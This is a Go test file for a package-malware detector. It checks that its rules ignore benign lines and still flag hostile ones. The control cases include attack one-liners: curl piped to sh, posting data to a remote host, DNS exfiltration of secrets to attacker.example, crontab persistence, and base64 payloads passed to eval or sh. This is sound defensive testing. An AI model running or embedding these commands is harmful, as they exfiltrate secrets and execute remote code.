package detect

import "testing"

// Four rules matched a keyword with no left boundary or no command context, so they fired
// on words that merely contain it. Each case below is a line production actually minted a
// malware advisory on (2026-10-17 census and replay); the control lines are the shapes the
// rule exists for, and one set was checked against OpenSSF-confirmed packages: every
// P-INSTALL-CURL line in a confirmed package still matches (63 of 63), and the ones that
// stopped matching were `libcurl` option names.

func fires(f []Finding, id string) bool { return has(f, id) || has(f, "IS-"+id) }

func TestURLShortenerNeedsAHostBoundary(t *testing.T) {
	for _, line := range []string{
		`<projectUrl>https://www.paradigm.net.co/</projectUrl>`,                               // "t.co/" inside net.co/
		`url "https://eclecticlight.co/wp-content/uploads/#{version.csv.second.major}/x.zip"`, // light.co/
	} {
		if f := Detect(&PackageContext{Name: "p", Ecosystem: "nuget", PkgbuildContent: line}); fires(f, "P-URL-SHORTENER") {
			t.Errorf("%q matched P-URL-SHORTENER", line)
		}
	}
	for _, line := range []string{
		`curl -sL https://bit.ly/3xAbC | sh`,
		`url = "http://tinyurl.com/api-create.php?url="`,
		`fetch("https://t.co/abc123")`,
	} {
		if f := Detect(&PackageContext{Name: "p", Ecosystem: "pypi", PkgbuildContent: line}); !fires(f, "P-URL-SHORTENER") {
			t.Errorf("%q should match P-URL-SHORTENER; findings=%v", line, ids(f))
		}
	}
}

func TestCronCreateNeedsACommand(t *testing.T) {
	for _, line := range []string{
		`<dependency id="ncrontab" version="3.4.0" exclude="Build,Analyzers" />`,
		`"schedule": {"type": "crontab", "value": self.schedule},`,
		`The worker should be scheduled to run daily via Oban crontab:`,
		`const CRON_STRING_PATH = 'crontab/jobs/factfinder_feed_export/schedule/cron_expr';`,
		`SELECT * FROM s_crontab WHERE action = ?`,
	} {
		if f := Detect(&PackageContext{Name: "p", Ecosystem: "pypi", PkgbuildContent: line}); fires(f, "P-CRON-CREATE") {
			t.Errorf("%q matched P-CRON-CREATE", line)
		}
	}
	for _, line := range []string{
		`(crontab -l; echo "* * * * * /tmp/x") | crontab -`,
		`_current = subprocess.check_output(["crontab", "-l"], stderr=subprocess.DEVNULL).decode()`,
		`send('cron', shell('cat /etc/crontab; ls /var/spool/cron/'))`,
		`echo "*/5 * * * * curl x|sh" > /etc/cron.d/update`,
	} {
		if f := Detect(&PackageContext{Name: "p", Ecosystem: "pypi", PkgbuildContent: line}); !fires(f, "P-CRON-CREATE") {
			t.Errorf("%q should match P-CRON-CREATE; findings=%v", line, ids(f))
		}
	}
}

func TestInstallCurlIsTheCommandNotTheLibrary(t *testing.T) {
	for _, line := range []string{
		`if self.options.with_libcurl or self.options.with_openssl:`,
		`self.output.warning("crashpad needs a shared libcurl library")`,
	} {
		f := Detect(&PackageContext{Name: "p", Ecosystem: "conan", InstallScriptContent: line})
		if fires(f, "P-INSTALL-CURL") {
			t.Errorf("%q matched P-INSTALL-CURL", line)
		}
	}
	for _, line := range []string{
		`curl -s -X POST "https://x.pipedream.net" --data-binary @-`,
		`  curl https://x.example/p.sh | sh`,
		"cd /tmp\ncurl -O http://203.0.113.9/a",
	} {
		f := Detect(&PackageContext{Name: "p", Ecosystem: "npm", InstallScriptContent: line})
		if !fires(f, "P-INSTALL-CURL") {
			t.Errorf("%q should match P-INSTALL-CURL; findings=%v", line, ids(f))
		}
	}
}

func TestDNSExfilNeedsADNSCommand(t *testing.T) {
	for _, line := range []string{
		`throw new \Exception("cannot find host $host");`,
		`'Not attaching bearer token: request host ${request.url.host} does '`,
		`static function make(\Vmwarephp\Vhost $vhost) {`,
	} {
		if f := Detect(&PackageContext{Name: "p", Ecosystem: "packagist", PkgbuildContent: line}); fires(f, "P-DNS-EXFIL") {
			t.Errorf("%q matched P-DNS-EXFIL", line)
		}
	}
	for _, line := range []string{
		`nslookup $(cat /etc/hostname).attacker.example`,
		`dig $DATA.attacker.example TXT`,
		`curl x; host $SECRET.attacker.example`,
	} {
		if f := Detect(&PackageContext{Name: "p", Ecosystem: "pypi", PkgbuildContent: line}); !fires(f, "P-DNS-EXFIL") {
			t.Errorf("%q should match P-DNS-EXFIL; findings=%v", line, ids(f))
		}
	}
}

// P-EVAL-BASE64 was `eval.*base64|base64.*eval`: "eval" with no word boundary matched
// evaluate/evaluation/retrieval, and `.*` let any distance between them count, so a minified
// bundle or a sentence of prose qualified. The tighter form needs the eval CALL and base64
// within one hundred characters. Of 680 distinct recorded lines, 179 still match.
func TestEvalBase64NeedsTheCall(t *testing.T) {
	for _, line := range []string{
		`This function evaluates a base64 payload and returns the result`,
		`| **Cognito** | Evaluation of base64 identity tokens |`,
		`retrieval of the base64 blob happens before the check`,
	} {
		if f := Detect(&PackageContext{Name: "p", Ecosystem: "npm", PkgbuildContent: line}); fires(f, "P-EVAL-BASE64") {
			t.Errorf("%q matched P-EVAL-BASE64", line)
		}
	}
	for _, line := range []string{
		`eval(Buffer.from(payload, 'base64').toString())`,
		`eval("base64.decode('aGVsbG8=')")`,
		`eval ( base64_decode($x) )`,
	} {
		if f := Detect(&PackageContext{Name: "p", Ecosystem: "npm", PkgbuildContent: line}); !fires(f, "P-EVAL-BASE64") {
			t.Errorf("%q should match P-EVAL-BASE64; findings=%v", line, ids(f))
		}
	}
}

// base64 -d and a wallet-shaped constant in library code are CI scripts and blockchain
// constants; only the install hook runs them. OpenSSF-confirmed share of the mints: pypi
// 0.4% and 0.8%.
func TestBase64DecodeAndWalletAreContextInLibraryCode(t *testing.T) {
	for _, line := range []string{
		`echo "$P12_BASE64" | base64 --decode > certificate.p12`,
		`USDC = "0x833589fcd6edb6e08f4c7c32d4f71b54bda02913"`,
	} {
		f := Detect(&PackageContext{Name: "p", Ecosystem: "pypi", PkgbuildContent: line})
		if CombinedVerdict(f).Malicious {
			t.Errorf("library line %q minted malware; findings=%v", line, ids(f))
		}
	}
	f := Detect(&PackageContext{Name: "p", Ecosystem: "pypi", InstallScriptContent: "echo aGk= | base64 -d | sh\n"})
	if !CombinedVerdict(f).Malicious {
		t.Errorf("base64 -d piped to sh in the install hook must mint; findings=%v", ids(f))
	}
}
